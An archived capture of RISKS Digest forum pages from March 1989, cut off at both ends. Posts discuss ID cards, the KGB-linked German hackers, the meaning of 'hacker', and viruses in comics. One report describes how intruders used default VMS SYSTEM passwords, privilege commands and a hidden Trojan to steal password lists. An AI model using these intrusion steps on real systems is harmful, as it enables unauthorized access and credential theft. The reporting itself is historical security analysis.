profound as is commonly supposed, according to a survey out today.

"Identity cards were compulsory during and immediately after the Second World
War.  ...  57 per cent of those questioned in today's survey were in favour ...

". . . everyone has a unique collection of official numbers, including a health
service number, a national insurance number, a passport number, another on
their driving licence and one issued by the Inland Revenue.  However free and
libertarian people might feel, they are deeply enmeshed by 20th century
bureaucracy - and for the most part accept their fate without complaint.

"The adoption of an identity card, at least on a voluntary basis, which would
carry such numbers - name, date of birth, nationality, signature and perhaps
blood group - would surely be an advantage for everybody. In one sense it would
be a master key. GIVEN THAT TECHNOLOGY SHOULD MAKE IT IMPOSSIBLE TO FORGE THEM,
such cards could quickly establish one's bona fide. . . ."

Ruaridh Macdonald

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computer catches thief
</A>
</H3>
<address>
&lt;<A HREF="mailto:davis@wheaties.ai.mit.edu   [RANDALL Davis, PLEASE identify yourself!]">
davis@wheaties.ai.mit.edu   [RANDALL Davis, PLEASE identify yourself!]
</A>&gt;
</address>
<i>
Sun, 5 Mar 89 15:25:10 est
</i><PRE>

In Risks 8:31, Michael C Polinske gives us the newspaper story of two men
caught stealing long distance telephone service, that ran with the headline:

		2 MEN ACCUSED OF `HACKER' CRIME

Interesting that the theft of service via hacking gets all the attention, when
part of the story (reproduced below) makes it clear that the headline could
equally well have been:

		COMPUTER CATCHES TWO STEALING PHONE SERVICE
	...
	The company's computer keeps track of all calls that are rejected
	because of an improper access code.  Clients dialing incorrectly would
	cause 10 to 30 rejected calls a month, but sometime last year the
	number jumped to 1,000 or 2,000 per month.

	Computer printouts showed the unknown parties were repeatedly dialing
	the computer and changing the access code sequentially, Reddin said.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Computer espionage: 3 `Wily Hackers' arrested 
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
02 Mar 89 21:43 GMT+0100
</i><PRE>

Today (February 2nd,1989), 3 hackers have been arrested in Berlin, Hamburg and
Hannover, and they are accused of computer espionage for the Soviet KGB.
According to TV magazine `Panorama' (whose journalists have first published the
NASA and SPANET hacks), they intruded scientific, military and industry
computers and gave passwords, access mechanisms, programs and data to 2 KGB
officers; among others, intrusion is reported of the NASA headquarters, the Los
Alamos and Fermilab computers, the US Chief of Staffs data bank OPTIMIS, and
several more army computers. In Europe, computers of the French-Italian arms
manufacturer Thomson, the European Space Agency ESA, the Max Planck Institute
for Nuclear Physics in Heidelberg, CERN/GENEVA and the German Electron
Accelerator DESY/Hamburg are mentioned. Report says that they earned several
100,000 DM plus drugs (one hacker evidently was drug addict) over about 3
years.

For the German Intelligence authorities, this is `a new quality of espionage'.
The top manager said that they had awaited something similar but are 
nevertheless surprised that it happened so soon and with such broad effects.

Summarizing the different events which have been reported earlier - NASA and
SPANET hacks, Clifford Stoll's report of the `Wily Hacker' - I regard this as
essentially the final outcome of the Wily Hackers story (with probably more
than the 3 which have now been imprisoned). It is surprising that the
Intelligence authorities needed so long time (after Cliff's CACM report, in May
1988!) to finally arrest and accuse these crackers. Moreover, the rumors
according to which design and production plans of a Megabit chip had been
stolen from Philips/France computers seems to become justified; this was the
background that CCC hacker Steffen Wernery had been arrested, for several
months, in Paris without being accused. CAD/CAM programs have also been sold to
KBG.
                    Klaus Brunnstein           University of Hamburg/FRG

     [There were numerous articles on this topic over the weekend.  Because
     almost every paper had a little something, our coverage here will
     remain light until we have some more definitive reports.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 re: West German Hackers
</A>
</H3>
<address>
Dana Kiehl 
&lt;<A HREF="mailto:Kiehl@DOCKMASTER.ARPA">
Kiehl@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Fri, 3 Mar 89 09:36 EST
</i><PRE>

Regarding today's (3rd of March) news on the West German Hackers who got
money and drugs from the KGB:

 If the story is accurate, this brings up another point about hacking: they
could be working for the enemy. Some people consider hackers as harmless
pranksters or not much of a threat but this story shows that the bugger
running around your system may very well be working for your competitor or
even the other side. Scary thought

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
The word "hacking" (<A HREF="/Risks/8.33.html">RISKS-8.33</A>)
</A>
</H3>
<address>
Geoffrey Knauth
&lt;<A HREF="mailto:lloyd!sunfs3!geoff@hscfvax.harvard.edu ">
lloyd!sunfs3!geoff@hscfvax.harvard.edu 
</A>&gt;
</address>
<i>
Fri, 3 Mar 89 10:14:09 EST
</i><PRE>

I object strongly to Peter Large's use of the words "hacking" and "hacker" in a
continually negative context, especially since he proposes to outlaw "hacking."

Much hacking is wonderful for society.  Take Richard Stallman, for example, the
driving force behind GNU and the Free Software Foundation.  He is a dedicated
hacker in the best sense of the word, and I only wish I could hack so well.  I
cannot accept statements which confuse productive hacking with harmful acts.

</PRE>
<HR><H3><A NAME="subj6.2">
  [RISKS]   `Hey...Who are you calling a "hacker"?' (<A HREF="/Risks/8.33.html">RISKS-8.33</A>)
</A>
</H3>
<address>
"Rao V. Akella" 
&lt;<A HREF="mailto:CCCSRAO@UMNHSNVE.BITNET">
CCCSRAO@UMNHSNVE.BITNET
</A>&gt;
</address>
<i>
03/03/89 19:28:42
</i><PRE>

&gt; Computer hacking should be made a criminal offence, the CBI said yesterday...

Hey, hey, wait a minute...since when has the term "hacker" become synonymous
with "criminal"?  I strongly object to the insinuation that ALL hackers are
criminals.  I personally consider the appellation "hacker" to be a badge of
honour.  I would dearly like to call myself "hacker", but in my own opinion I'm
not good enough yet.  I would love it if anyone called me a "hacker" (I badly
want someone to, but no one has - yet.)

According to Steven Levy's "Hackers", the term "hacker" was coined at MIT in
the 1950s, and it implied 'serious respect','innovation, style and technical
virtuosity' and 'artistry'.  Why has this word come to stand for serious
wrong-doing today?  Today's (March 3rd, 1989) NBC Nightly News with Tom Brokaw
had a story about 3 West German "computer hackers" being convicted (and 5 other
"hackers" being charged) for providing the Soviets with sensitive computer
passwords.  Why is it that a computer programmer automatically becomes a
"hacker" when it involves a crime?  Why couldn't they have reported '...3 West
German computer programmers have been convicted...'?  If some of you think that
I'm making a mountain out of a molehill, then I demand that all programming job
classifications be renamed to "Applications Hacker", "Systems Hacker", and so
on.  It would make at least me very happy.  In my humble opinion, this much
maligned word is becoming as overused and abused as that other overloaded
operator of the late 1980s: "computer virus".

Rao Akella, Research Assistant, University of Minnesota CCCSRAO@UMNHSNVE.BITNET

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
747 Simulators Can't Simulate Flight 811 Failures
</A>
</H3>
<address>
Scot E Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.mn.org ">
sewilco@datapg.mn.org 
</A>&gt;
</address>
<i>
5 Mar 89 04:00:27 GMT
</i><PRE>

The Wall Street Journal of March 1 1989, page 1, had an article on United's
Flight 811 which mentions:
	"The Role of Skill
	   Training prepares airline pilots for all sorts of emergencies,
	but nothing like the one Flight 811 encountered.  There aren't any
	simulator programs for losing two engines on the same wing of a
	747, let alone flying with a 10-by-25 foot hole in the fuselage."

The wording of "on the same wing" suggests there are simulators which
allow one engine on each wing to be lost, so the possibility of multiple
engine failure has not been completely overlooked.

The article later points out there is no way to prepare for all the
possible things that can go wrong.

Scot E. Wilcoxon  sewilco@DataPg.MN.ORG    {amdahl|hpda}!bungia!datapg!sewilco
Data Progress 	 UNIX masts &amp; rigging  +1 612-825-2607    uunet!datapg!sewilco

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Viruses in the comics
</A>
</H3>
<address>
Peter Merel
&lt;<A HREF="mailto:pete@attila.oz.au ">
pete@attila.oz.au 
</A>&gt;
</address>
<i>
Sun, 5 Mar 89 23:58:16 AES
</i><PRE>

Viruses and other nefarious hacker activities have been included as plot
devices in DC's revival of 'The Shadow'. In this book The Shadow has returned
from Shambhalla (sp?) to the West after an absence of over 40 years to carry on
his war on the evil that men do. Two of the new agents recruited into his
service belong to a hacker consortium calling itself 'The Shadownet'.

While the book is not intended as any sort of explication of hacking activities
or computer activities in general, I've not seen any outright mistakes in its
presentation of hacking. Of course I'm not sure whether it is really that easy
to hack into the Orbital Mind Control Lasers.

Worth a read if you're interested in the RISKS to society of coordinated
networks of technically competent people. Also hysterically funny. "The weed of
crime bears bitter fruit..."

</PRE>
<HR><H3><A NAME="subj8.2">
Viruses in the comics
</A>
</H3>
<address>
Tom Parker
&lt;<A HREF="mailto:firewind%xroads%sunburn@sun.UUCP ">
firewind%xroads%sunburn@sun.UUCP 
</A>&gt;
</address>
<i>
3 Mar 89 22:33:25 MST (Fri)
</i><PRE>
 
     I can think of a few examples of computer virii in the comics.  In a
semi-recent issue of "Alpha Flight", the story revolves around a virus who's
function is to "transfer credits to author".  The virus is "written in
machine code so it can infect any machine".  In a not so recent issue of
Iron Man, a "tapeworm" is introduced into the world's computer network to
erase certain blueprints where ever they might appear.
     In both instances the virii are portrayed as invincible and able to
infect any computer.  I'm afraid that any depiction of viruses in the comics
is going to be simplistic and pretty much out of touch with reality.
                                        Tom

</PRE>
<HR><H3><A NAME="subj8.3">
Viruses in the comics
</A>
</H3>
<address>
"Len Levine" 
&lt;<A HREF="mailto:len@evax.milw.wisc.EDU">
len@evax.milw.wisc.EDU
</A>&gt;
</address>
<i>
Fri, 3 Mar 89 11:27:38 CDT
</i><PRE>

Kelly, a cartoonist in the San Diego Union posted a cartoon recently with
several panels discussing the danger of swapping floppies with comments from
the cartoon characters like:

He:  I think we should do it.
She: No way, I hardly know you.

He:  Come on, you only live once.
She: No way, there are too many viruses out there.

He:  You know you want to.
She: The threat of infection mortifies me.

He:  _Please_!
She: Well maybe, just this once.

He:  [he hands her a floppy]
She: Trading software is so risky these days.

This is good educational techniques.  It gets the point across.

Leonard P. Levine               e-mail len@evax.milw.wisc.edu |
Professor, Computer Science             Office (414) 229-5170 |
University of Wisconsin-Milwaukee       Home   (414) 962-4719 |
Milwaukee, WI 53201 U.S.A.              Modem  (414) 962-6228 |

</PRE>
<HR><H3><A NAME="subj8.4">
Intelligent treatment of viruses in comics
</A>
</H3>
<address>
&lt;<A HREF="mailto:"Guy_Robinson.SBDERX<"@Xerox.COM">
"Guy_Robinson.SBDERX&lt;"@Xerox.COM
</A>&gt;
</address>
<i>
6 Mar 89 02:47:04 PST (Monday)
</i><PRE>

Marvel Comics traditionally deal with computers in a very intelligent way.
Very often the younger intelligent "super-heroes" are seen using computers for
both work and recreation.  This is not to say something totally unfeasible
happens from time to time but this simply requires suspension of disbelief.

The example in point I want to use is the current storyline concerning the
Vision, an android.  Due to a previous severe computer crime the Vision was
kidnapped and stripped bare of all software.

To prevent a simple back-up being taken a virus was used to destroy all
saved copies of the Vision's personality.  This virus propogated itself
around several machines to ensure the task was completed.

One problem this situation raised was that the Vision's human WIFE was a little
distraught! Could this be a whole new type of RISK to bear in mind?
                                                                      Guy

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.34.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.36.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-86</DOCNO>
<DOCOLDNO>IA013-000132-B047-134</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.36.html 128.240.150.127 19970217025905 text/html 24691
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:57:32 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 36</TITLE>
<LINK REL="Prev" HREF="/Risks/8.35.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.37.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.35.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.37.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 36</H1>
<H2> Tuesday 7 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Malicious Hacking 
</A>
<DD>
<A HREF="#subj1.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  News from the KGB/Wily Hackers 
</A>
<DD>
<A HREF="#subj2.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  The fight to purify the word "hacker" is lost 
</A>
<DD>
<A HREF="#subj3.1">
Steve Bellovin
</A><br>
<A HREF="#subj3.2">
 Brad Templeton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Dangers of Spy programs 
</A>
<DD>
<A HREF="#subj4.1">
John ffitch
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: reach out and spy on someone 
</A>
<DD>
<A HREF="#subj5.1">
Vandenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Social effects of viruses 
</A>
<DD>
<A HREF="#subj6.1">
Don Alvarez
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Previous message to RISKS misunderstood 
</A>
<DD>
<A HREF="#subj7.1">
John Sinteur
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
The RISKS Forum is moderated.  Contributions should be relevant, sound, in good
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
taste, objective, coherent, concise, and nonrepetitious.  Diversity is welcome.
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
* RISKS MOVES SOON TO csl.sri.com.  FTPable ARCHIVES WILL REMAIN ON KL.sri.com.
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
CONTRIBUTIONS to RISKS@CSL.SRI.COM, with relevant, substantive "Subject:" line
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj13">

</A>
<DD>
<A HREF="#subj13.1">
otherwise they may be ignored
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj14">
FOR VOL i ISSUE j / ftp KL.sri.com / login anonymous 
</A>
<DD>
<A HREF="#subj14.1">
ANY NONNULL PASSWORD
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj15">
  get stripe:&lt;risks&gt;risks-i.j ... (OR TRY cd stripe:&lt;risks&gt; / get risks-i.j ...
</A>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj16">
  Volume summaries in (i.j)=(1.46),(2.57),(3.92),(4.97),(5.85),(6.95),
</A>
<DD>
<A HREF="#subj16.1">
7.99
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Malicious Hacking
</A>
</H3>
<address>
Gene Spafford
&lt;<A HREF="mailto:spaf@cs.purdue.edu ">
spaf@cs.purdue.edu 
</A>&gt;
</address>
<i>
7 Mar 89 19:45:38 GMT
</i><PRE>

I've recently been in contact with someone doing a study for DOE on malicious
hacking.  In particular, the following 3 topics have been specifically
targetted for attention:
   1) Have there been any documented cases of loss of life, threat to
   life, massive economic loss, or other disastrous circumstances
   caused by someone breaking into or hacking on a system?  This is
   *not* concerned with system failures or poor design, but rather
   with acts of specific intent.
   2) Have there been any documented (or strongly suspected) cases
   of hacking/cracking/etc. for purposes of corporate espionage or
   sabotage, or for service to a foreign government?  The recent
   West German arrests are one case...are there others?
   3) Has anyone (other than Sherry Turkle) done any work on the
   psychological profile of someone likely to break into systems,
   be a compulsive hacker/cracker, etc?  If so, do you have references?

If you have any material on the above, I'd appreciate hearing about it.
I'd like to see if for my class on ethics &amp; responsibility, and my
contact would like it for his report.  I'm sure that anyone
contributing to the report will get a copy, assuming that the final
report is unclassified.

Thanks in advance.     Gene Spafford
NSF/Purdue/U of Florida  Software Engineering Research Center,
Dept. of Computer Sciences, Purdue University, W. Lafayette IN 47907-2004
Internet:  spaf@cs.purdue.edu	uucp:	...!{decwrl,gatech,ucbvax}!purdue!spaf

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
News from the KGB/Wily Hackers
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
07 Mar 89 18:52 GMT+0100
</i><PRE>

Now, 5 days after the `sensational' disclosure of the German (NDR) Panorama TV
team, the dust of speculations begins to rise and the facts become slowly
visible; moreover, some questions which could not be answered (e.g. in Clifford
Stoll's CACM paper) may now be answered. Though not all facts are known
publicly, the following facts seem rather clear (most of the material has been
published; I learned some facts when I analysed, for another Panorama story,
some of the lists which had been sold to KGB, according to the journalists):

    - In 1986, some hackers from W.Berlin and Hannover discussed, 
      in `hacker parties' with alcohol and drugs, how to solve some 
      personal financial problems; at that time, first intrusions of 
      scientific computers (probably CERN/Geneva as `hacker training 
      camp) and CCC's spectacular Btx-intrusion gave many hackers 
      (assisted by newsmedia) the *puerile impression* that they could 
      intrude *into every computer system*; I remember contemporary 
      discussions on 1986/87 Chaos Computer Conferences about 
      possibilities, when one leading CCC member warned that such hacks 
      might also attract espionage (Steffen Wernery recently told
      that German counter-espionage had tried several times to hire
      him and other CCC members as advisors - unsuccessfully).

    - A `kernel group' of 5 hackers who worked together, in some way, 
      in the `KGB case' are (according to Der SPIEGEL, who published 
      the following names in its Monday, March 6 edition):

      -&gt;Markus Hess, 27, from Hannover, Clifford Stoll's `Wily
        Hacker': after having ended (unfinished) his studies in 
        Mathematics, he works as programmer, and tries to get an
        Informatics diploma at the University of Hagen (FRG); he
        is said to have good knowledge of VMS and UNIX (see Cliffs
        paper: it seems to give a good personal profile!).

      -&gt;Karl Koch, 23, from Hannover, who works as programmer;
        due to his luxurious lifestyle and his drug addiction, 
        his permanent financial problems have probably catalysed 
        the desire to sell `hacker knowledge' to interested 
        institutions.

      -&gt;Hans Huebner, alias `Pengo', from Berlin, who after having
        received his Informatics diploma from Technical University
        of W.Berlin, founded a small computer house; the SPIEGEL
        writes that he needed money for investment in his small
        enterprise; though he doesnot belong to Chaos Computer
        Club (as he told me during last Chaos Computer Conference,
        December 1988), he holds close contacts to the national
        hacker scenes (Hamburg: Chaos Computer Club; Munich: Bavarian
        Hacker Post; Cologne: Computer Artists Cologne, and other
        smaller groups), and he was the person to speak about UUCP
        as a future communications medium (cf. my CCC'88 report
        in Risk Forum 89/01).

      -&gt;Dirk Brezinski, from W.Berlin, programmer and sometimes
        `troubleshooter' for Siemens BS-2000 systems (the operating
        system of Siemens mainframe computers), who earned, when
        working for Siemens or a customer (BfA, a national insurance
        for employees) 20,000 DM (about 10,800 $) a month; he is
        regarded (by an intelligence officer) as `some kind of a 
        genious'.

      -&gt;Peter Carl, from W.Berlin, a former croupier, who `always
        had enough cocaine'. (No information about his computer
        knowledge/experience available).

After successfully stimulating KGB's interest, the group (mainly Hess and Koch)
committed their well-documented hacks (--&gt;Clifford Stoll: `Stalking the Wily
Hacker', CACM May 1988). SPIEGEL writes that the group *sold 5 diskettes full
of passwords*, from May to December 1986, to KGB officers which they met in
East Berlin; when Bremen University computer center, their favorite host for
transatlantic hacks, asked (Dec.86) the police to uncover the reasons for their
high telephone bills, they stopped the action.

This statement of Der SPIEGEL is probably wrong: as Cliff describes, the `Wily
Hacker' successfully worked until early 1988, when the path from his
PC/telephone was disclosed by TYMNET/German Post authorities (the German public
prosecutors didnot find enough evidence for a trial, when examining Hess'
apartment; moreover, they had acquired the material in illegal actions, so the
existing evidence couldnot be used and finally had to be scratched!).

In Hess' apartment, public prosecutors found (on March 3, 1989) password lists
from other hacks. On Monday, March 6, 1989, the Panorama team (who had
disclosed the NASA hack and basically the KGB connection) asked me to examine
some of the password lists; the material which I saw (for 30 minutes) consisted
of about 100 photocopied protocols of a hack during the night of July 27 to 28,
1987; it was the famous `NASA hack':  From a VAX 750 (with VMS 4.3), which they
entered via DATEX-P (the German packed-switched data-exchange network, an X.25
version), where they evidently previously had installed a Trojan horse
(UETFORT00.EXE), they tried, via SET HOST ..., to log-into other VAXes in
remote institutes. They always used SYSTEM account and the `proper' password
(unvisible).
          
    [Remark: Unfortunately, DECs installation procedure works only if a SYSTEM
    account is available; evidently, most system managers do not change the
    preset default password MANAGER; since Version 4.7, MANAGER is excluded,
    but on previous VMS versions, this hole probably exists in many systems!]

Since the hackers, in more than 40% of the cases, succeeded to login, their
first activitities were to SET PRIV=ALL; SET PRIO=9, and then to install (via
trans-net copy) the Trojan horse.  With the Trojan horse (not displayed under
SHow Users), they copied the password lists to their PCs. When looking through
the password list, I observed the well-known facts: more than 25% female or
male first names, historical persons, countries, cities, or local dishes (in
the Universities of Pisa, Pavia and Bologna, INSALATA was/is a favorite
password of several people).  Only in CASTOR and POLLUX, the password lists
contained less than 5% passwords of such nature easy to guess!

Apart from many (about 39) unsuccessful logins, many different CERN /GENEVA,
NASA systems (CASTOR, POLLUX, Goddard and Ames Space Flight Centers), several
US, GB, French, Italian and some German institutes connected in SPANEt were
`visited'. The documented session was from July 27, 10 p.m. to July 28, 1 a.m.
(I am not sure that I saw all the material available).

The media report that other hacks (probably not all committed by Hess and Koch
theirselves) were sold to KGB. Among them, Electronic and Computer Industry
seem to be of dominant interest for the USSR. If special CAD/CAM programs and
Megabit designs (esp.  from Thomson/France, from VAX systems) have been stolen,
the advantage and value for the USSR cannot be (over)estimated.

In FRG, the current discussion is whether the hackers succeeded to get into
`kernel areas' or only `peripheral areas'. This discussion is ridiculous since
most `peripheral systems' contain developments (methods, products) for future
systems, while the `kernel systems' mainly contain existing applications (of
past architectures).

The well-known hackers (esp.CCC) have been seriously attacked by some media. My
best guess is that CCC was itself *a victim* because the group succeeded to
informally get much of the information which they needed for some of the hacks,
and which they finally sold to KGB. Apart from `Pengo', I dont see close
relation between CCC and the KGB/Wily Hackers. Nevertheless, CCC and others,
like Cheshire Catalyst in US, have prepared a climate where espionage
inevitably sprang-off.

Klaus Brunnstein   Hamburg/FRG.
  
</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
What's a hacker? (The fight to purify the word "hacker" is lost)
</A>
</H3>
<address>
&lt;<A HREF="mailto:ulysses!smb@research.att.com">
ulysses!smb@research.att.com
</A>&gt;
</address>
<i>
Tue, 07 Mar 89 22:13:14 EST
</i><PRE>

I'm not sure we want to open this can of worms (again), but...

The grammatical world is divided into two camps on such questions, the
prescriptivists and the descriptivists.  The former know the ``proper'' usage
for every word and phrase; the latter tell it like it is.  To insist that
``hacker'' still retains its original meaning is to align yourself with the
former camp.  Face it, that battle is over, and the purists have lost; the word
hacker, in many contexts, does now mean a criminal.

I've always been a descriptivist; trying to legislate how people talk is a
singularly fruitless activity, the activities of certain governments
notwithstanding.
                            	--Steve BEllovin

</PRE>
<HR><H3><A NAME="subj3.2">
The fight to purify the word "hacker" is lost
</A>
</H3>
<address>
Brad Templeton 
&lt;<A HREF="mailto:brad%looking.uucp@RELAY.CS.NET">
brad%looking.uucp@RELAY.CS.NET
</A>&gt;
</address>
<i>
Mon Mar  6 22:30:10 1989
</i><PRE>

It is with regret that I have to say that this fight has been lost.  "Hacker"
and "computer criminal" are now equated in the public mind, to the extent that
this use of "hacker" now appears in newspaper headlines.  The German Spy
breakins confirm this in papers all over the world.

Once this has happened, we can't win the battle to get the old meaning back.

Who am I to announce the loss of this battle?  A frontliner.  My custom licence
plate is "HACK."  I got it back in the early days when it meant wizard.  Sigh.

Brad Templeton, Looking Glass Software Ltd.  --  Waterloo, Ontario 519/884-7473

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
False fire alarms
</A>
</H3>
<address>
Peter Scott 
&lt;<A HREF="mailto:PJS@grouch.JPL.NASA.GOV">
PJS@grouch.JPL.NASA.GOV
</A>&gt;
</address>
<i>
Tue,  7 Mar 89 10:02:21 PST
</i><PRE>

A colleague just related a story to me about his apartment building.
Recently the water main supplying the sprinklers fractured, some distance
away from the building.  The fire alarm is triggered by a drop in water
pressure in the sprinkler system, on the thesis that a sprinkler has been
set off.  So the fire department arrived, but couldn't figure out why the
alarms wouldn't shut off when no smoke alarms had been triggered, no
call buttons had been pushed, no sprinklers were running, and there was
nary a wisp of smoke.

Peter Scott (pjs@grouch.jpl.nasa.gov)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Dangers of Spy programs
</A>
</H3>
<address>
jpff@maths.bath.ac.uk    
&lt;<A HREF="mailto:@NSS.Cs.Ucl.AC.UK">
@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Tue, 7 Mar 89 18:10:54 GMT
</i><PRE>

The recent discussion of this reminds me of an incident which happened
when I was a research student in Cambridge (way back..) when the
computer we had was Titan.  A staff member wrote a program (called
L/WHO for other ex-Cambridge folk) which told who was logged on, and what
they were doing.  This was the first multiple access system in the UK,
and so this kind of information was of great interest.  A friend of
mine, Robin Fairbairns, took the program an extended it to give more
information, and we all enjoyed using it.  One of his enhancements was
to show which magnetic tapes a user had loaded.
  Now the incident.  The Titan Operating system scheduled tape jobs
separately as tape decks were a scarce resource.  In order to improve
throughput the scheduler would accelerate starting jobs which used
tapes which were already on a drive.  Using the L/WHO program a
student determined which tapes were in use, and used the information
to get their programs run quickly.  Of course the operators did not
notice the effect, as the tape scheduling was totally automatic, and
the cheating program did actually use the tape.  That is until the day
when the student program inadvertently wrote to block device zero, and
as this was a tape (usually it would be scratch disk) the tape was
overwritten.  The owner of the tape was not amused at all (I will
suppress the name as they are still very active).  Robin was persuaded
to remove the facility of giving tape names.
  The operators objected of course.  The operating system was not good at
telling them which tape was where, and they had been relying on L/WHO for some
time.  The upshot was that the spy program had a "is this user the operator"
function added (and also a "is this Robin F" bit).  After that I believe it
survived until the unfortunate switching off of such a great machine.
  I will not attempt a moral, except to remark that the program did not use any
privileged information.                                          ==John ffitch

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: reach out and spy on someone
</A>
</H3>
<address>
vandenberg
&lt;<A HREF="mailto:vanden@studsys.mu.edu ">
vanden@studsys.mu.edu 
</A>&gt;
</address>
<i>
6 Mar 89 03:05:06 CST (Mon)
</i><PRE>

Although I'm not a UNIX guru (or even close for that matter) I do know that
it is possible to 'monitor' someone else's terminal.  With our setup, a 3b5
running SYS5, the defaults are such that anyone can 'see' what's on another
